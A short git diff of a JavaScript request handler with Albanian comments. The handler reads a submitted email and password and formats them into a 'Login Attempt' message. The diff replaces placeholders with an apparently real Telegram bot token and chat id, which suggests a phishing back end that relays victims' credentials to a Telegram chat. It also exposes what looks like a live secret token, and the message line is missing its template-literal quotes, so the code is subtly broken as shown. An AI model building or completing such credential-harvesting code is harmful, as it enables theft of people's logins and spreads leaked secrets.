@@ -11,8 +11,8 @@ export default async function handler(req, res) {
     return res.status(400).json({ error: "Email dhe password kërkohen" });
   }
 
-  const token = "YOUR_BOT_TOKEN_HERE"; // vendos tokenin tënd
-  const chat_id = "YOUR_CHAT_ID_HERE"; // vendos chat id-n tënd
+  const token = "8389609435:AAEmJzVFTtNHUGFVv-04yqYrtGy-J_CFQ5A"; // vendos tokenin tënd
+  const chat_id = "-1002713619472"; // vendos chat id-n tënd
 
   const message = 🔐 Login Attempt\nEmail: ${email}\nPassword: ${password};
 
